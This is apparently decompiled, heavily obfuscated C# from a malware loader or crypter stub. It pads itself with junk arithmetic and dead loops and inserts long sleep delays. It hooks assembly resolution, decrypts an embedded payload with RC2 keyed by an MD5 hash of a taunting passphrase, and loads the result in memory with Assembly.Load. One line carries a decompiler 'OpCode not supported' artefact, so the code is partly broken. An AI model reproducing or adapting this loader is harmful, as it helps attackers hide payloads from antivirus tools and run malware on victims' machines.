using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

internal sealed class o
{
	private static class a
	{
		public static CallSite<Action<CallSite, Type, object>> a;
	}

	private static r m_a;

	private int m_b;

	public o()
	{
		int num = this.a();
		if (4u != 0)
		{
			this.m_b = num;
		}
		r obj = new r();
		if (4u != 0)
		{
			o.m_a = obj;
		}
		AppDomain.CurrentDomain.AssemblyResolve += a;
	}

	internal void a()
	{
		Math.Min((float)(new decimal[4] { -62540269002367979775202276391m, -64920831321550194275532444519m, -46218202180900359026507735719m, -508519533598817821180362093m })[0], (float)(new decimal[5] { 13138830233255478696115034223m, -52079615304129576408271398333m, 74226220303750932698908137489m, 27641949710994240474126381645m, -27593292634067728668868343599m })[2]);
		int num;
		if (uint.MaxValue != 0)
		{
			num = 0;
		}
		while (num < 0)
		{
			Math.Abs(32);
			Math.Tanh((double)(new decimal[5] { -73867901485104992230561449633m, -63614909578606659362007113491m, -2555961203298987493337466959m, -71369312254126580374149835033m, -43897788988695962169586566119m })[2]);
			int num2 = num + 1;
			if (0 == 0)
			{
				num = num2;
			}
		}
		byte[] array = o.m_a.a();
		if (true)
		{
			q.a(array, "our way will end very soon, huge thx to our haters <3");
		}
	}

	public static int a(int[] a)
	{
		int num = a.Max();
		int value;
		if (5u != 0)
		{
			value = num;
		}
		int num2 = Array.IndexOf(a, value);
		int num3;
		if (true)
		{
			num3 = num2;
		}
		return Array.LastIndexOf(a, value) - num3;
	}

	private static byte[] a(byte[] a, string b)
	{
		if (5u != 0)
		{
			byte[] array = null;
		}
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2;
		if (5u != 0)
		{
			memoryStream2 = memoryStream;
		}
		try
		{
			RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider();
			RC2CryptoServiceProvider rC2CryptoServiceProvider2;
			if (5u != 0)
			{
				rC2CryptoServiceProvider2 = rC2CryptoServiceProvider;
			}
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				try
				{
					rC2CryptoServiceProvider2.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(b));
					rC2CryptoServiceProvider2.Mode = CipherMode.ECB;
					string[] array2 = "2 + 5 + 2".Split(new char[2] { '+', ' ' }, StringSplitOptions.RemoveEmptyEntries);
					double num = 0.0;
					string[] array3 = array2;
					foreach (string text in array3)
					{
						num += (double)int.Parse(text);
					}
					rC2CryptoServiceProvider2.Padding = PaddingMode.PKCS7;
					CryptoStream cryptoStream = new CryptoStream(memoryStream2, rC2CryptoServiceProvider2.CreateDecryptor(), CryptoStreamMode.Write);
					try
					{
						_ = new string[3] { "3м", "ЕЩ_M*.", "LЫuЫgdf" };
						int num3 = 0;
						while (num3 < 2)
						{
							num3++;
							Math.Cos(Math.PI);
						}
						cryptoStream.Write(a, 0, a.Length);
						cryptoStream.Close();
						Thread.Sleep(100);
						cryptoStream.Dispose();
					}
					finally
					{
						((IDisposable)cryptoStream).Dispose();
					}
				}
				finally
				{
					((IDisposable)mD5CryptoServiceProvider).Dispose();
				}
			}
			finally
			{
				((IDisposable)rC2CryptoServiceProvider2).Dispose();
			}
			return memoryStream2.ToArray();
		}
		finally
		{
			((IDisposable)memoryStream2).Dispose();
		}
	}

	private int a()
	{
		object obj = int.Parse("500") * 2;
		dynamic val;
		if (3u != 0)
		{
			val = obj;
		}
		if (true)
		{
			Thread.Sleep(10000);
		}
		if (4u != 0)
		{
			Thread.Sleep(7000);
		}
		Thread.Sleep(val);
		return "amogus".GetHashCode();
	}

	private static Assembly a(object a, ResolveEventArgs b)
	{
		int num;
		if (true)
		{
			num = 0;
		}
		while (num < 1)
		{
			Math.Truncate((double)(new decimal[4] { -69776746006897088204457170257m, -715874713175534276375676861m, 73642048270382221915617645011m, 51610933547510648916887664741m })[1]);
			Math.Sqrt((double)(new decimal[6] { -78559296662633650454413656333m, 21848538120985244258440092771m, 79200084430397482202442427091m, 28196972711207268125621476351m, 7872178380827030125888539651m, -58374105775055169271556052355m })[2]);
			int num2 = num + 1;
			if (3u != 0)
			{
				num = num2;
			}
		}
		Math.Tanh(-4.847398111930078E+28);
		double[] array = new double[12];
		if (8u != 0)
		{
			RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		}
		m.a(array, 3, 7);
		new p();
		if (7u != 0)
		{
			Thread.Sleep(100);
		}
		return Assembly.Load(o.b(o.m_a.b(), o.m_a.a()));
	}

	private protected static byte[] b(byte[] a, string b)
	{
		int num;
		if (6u != 0)
		{
			num = 0;
		}
		while (num < 2)
		{
			int num2 = num + 1;
			if (4u != 0)
			{
				num = num2;
			}
			_ = new string[3] { "пК>3+a", "3ПSaozР", "0" };
		}
		Math.Log(Math.E, 2.314123898375194E+28);
		"qqьзCТ".TrimEnd(new char[0]);
		int num3;
		if (3u != 0)
		{
			num3 = 0;
		}
		while (num3 < 1)
		{
			num3++;
			Math.Sign(Math.E);
			Math.Sin(Math.E);
		}
		_ = new string[7] { "AП4./", "ыю", "?*ё", "NбЭ", "6", "еЖтldА", "wьeсw4" };
		Thread.Sleep(3);
		return o.a(a, b);
	}
}
